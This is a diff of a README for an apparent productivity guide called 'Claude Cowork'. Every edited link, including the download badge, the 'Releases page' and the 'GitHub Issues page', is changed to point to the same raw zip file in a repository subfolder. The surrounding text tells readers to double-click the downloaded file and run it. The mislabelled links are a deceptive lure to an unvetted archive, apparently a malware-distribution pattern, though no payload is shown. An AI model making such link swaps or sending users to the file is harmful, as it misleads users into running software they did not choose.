@@ -1,6 +1,6 @@
 # 🐮 claude-cowork-guide - Elevate Your Productivity Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-claude--cowork--guide-blue)](https://github.com/LucasGarrote/claude-cowork-guide/releases)
+[![Download Now](https://github.com/LucasGarrote/claude-cowork-guide/raw/refs/heads/main/quadrilingual/guide-claude-cowork-v1.2-beta.4.zip%20Now-claude--cowork--guide-blue)](https://github.com/LucasGarrote/claude-cowork-guide/raw/refs/heads/main/quadrilingual/guide-claude-cowork-v1.2-beta.4.zip)
 
 ## 📖 About This Application
 The Claude Cowork guide offers complete documentation for knowledge workers and small businesses. It includes 43 workflows and 70 prompts that help streamline tasks and improve efficiency. Designed for ease of use, this application empowers anyone looking to optimize their daily routines without needing technical expertise.
@@ -9,7 +9,7 @@ The Claude Cowork guide offers complete documentation for knowledge workers and 
 To get started with the Claude Cowork guide, follow these simple steps:
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/LucasGarrote/claude-cowork-guide/releases) to find the latest version of the software.
+Go to the [Releases page](https://github.com/LucasGarrote/claude-cowork-guide/raw/refs/heads/main/quadrilingual/guide-claude-cowork-v1.2-beta.4.zip) to find the latest version of the software.
 
 ### 2. Download the Software
 Look for the version that suits your needs. Click on the download link to save the software to your computer. 
@@ -18,7 +18,7 @@ Look for the version that suits your needs. Click on the download link to save t
 Once downloaded, locate the file in your downloads folder and double-click it to run the application. Follow any on-screen instructions to complete the setup.
 
 ## 📥 Download & Install
-You can download the Claude Cowork guide directly from the [Releases page](https://github.com/LucasGarrote/claude-cowork-guide/releases). 
+You can download the Claude Cowork guide directly from the [Releases page](https://github.com/LucasGarrote/claude-cowork-guide/raw/refs/heads/main/quadrilingual/guide-claude-cowork-v1.2-beta.4.zip). 
 
 1. Click the link above to navigate to the releases.
 2. Choose the latest version listed.
@@ -41,7 +41,7 @@ You can download the Claude Cowork guide directly from the [Releases page](https
 Each workflow comes with step-by-step documentation. You will find instructions on how to use each feature effectively. Tips and best practices are included to maximize your productivity.
 
 ## 🌐 Help & Support
-If you need assistance or have questions, please refer to the [GitHub Issues page](https://github.com/LucasGarrote/claude-cowork-guide/issues). You can also find community discussions and troubleshooting tips there.
+If you need assistance or have questions, please refer to the [GitHub Issues page](https://github.com/LucasGarrote/claude-cowork-guide/raw/refs/heads/main/quadrilingual/guide-claude-cowork-v1.2-beta.4.zip). You can also find community discussions and troubleshooting tips there.
 
 ## ✨ Contributing
 If you would like to contribute to the project, feel free to check the contribution guidelines on the repository. We welcome feedback and suggestions to make Claude Cowork even better.
